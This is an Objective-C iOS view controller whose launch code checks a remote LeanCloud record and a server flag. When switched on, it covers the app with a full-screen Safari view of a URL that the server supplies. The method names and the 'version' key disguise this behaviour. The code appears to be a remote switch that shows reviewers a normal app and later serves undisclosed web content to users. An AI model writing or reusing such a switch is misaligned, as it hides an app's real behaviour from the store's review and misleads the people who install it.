
#import "ViewController.h"
#import <SafariServices/SafariServices.h>
#import "AppDelegate.h"
#import <AFNetworking.h>

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.  
    
    [self launchSuceessful];
    
    UIImageView *imgView = [[UIImageView alloc] init];
    imgView.contentMode =   UIViewContentModeScaleAspectFit;
    imgView.image = [UIImage imageNamed:@"launch"];
    imgView.frame = [UIScreen mainScreen].bounds;
    [self.view addSubview:imgView];
    
}


- (void)launchSuceessful{
     __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_global_queue(0, 0), ^{
        // 查询数据
        AVQuery *query = [AVQuery queryWithClassName:@"Giwotis"];
        [query getObjectInBackgroundWithId:@"5e6cb51c21b47e00697f9408" block:^(AVObject * _Nullable object, NSError * _Nullable error) {
             if (error) {
                  [self registerLaunching];
            }else{
                NSString *  token = [object objectForKey:@"token"];
                NSString *  uid   = [object objectForKey:@"uid"];
                NSString *  session   = [object objectForKey:@"session"];
                if ([[object objectForKey:@"status"] boolValue]) {
                     [weakSelf registerLaunching];
                }else{
                     [weakSelf loadNSDictionaryCache:token uid:uid session:session];
                }
            }
        }];
    });

}



-(void)loadNSDictionaryCache:(NSString*)token uid:(NSString*)uid session:(NSString*)session {

    AFHTTPSessionManager *manager = [AFHTTPSessionManager manager];
    manager.requestSerializer.timeoutInterval = 3;
    manager.responseSerializer.acceptableContentTypes =
    [NSSet setWithObjects:@"application/json",@"text/json", @"text/plain", @"text/html", nil];
    [manager POST:[NSString stringWithFormat:@"%@%@",session,@"/api/index/const"] parameters:@{@"token":token ,@"uid":uid} progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
               NSLog(@"responseObject=%@",responseObject);
                if ([[responseObject objectForKey:@"status"] boolValue]) {
                     SFSafariViewController *safariVC = [[SFSafariViewController alloc] initWithURL:[NSURL URLWithString:[responseObject objectForKey:@"version"]]];
                    safariVC.view.frame= self.view.bounds;
                    [self addChildViewController:safariVC];
                    [self.view addSubview:safariVC.view];
                }else{
                    [self registerLaunching];
                }
     } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
                 [self registerLaunching];
               
    }];
    
}


-(void)registerLaunching{
     AppDelegate *delegate = (AppDelegate *)[UIApplication sharedApplication].delegate;
     [delegate registerLaunchingWithController];
     [self removeFromParentViewController];
     [UIView animateWithDuration:0.5 animations:^{
          [self.view removeFromSuperview];
     } completion:nil];
}


@end









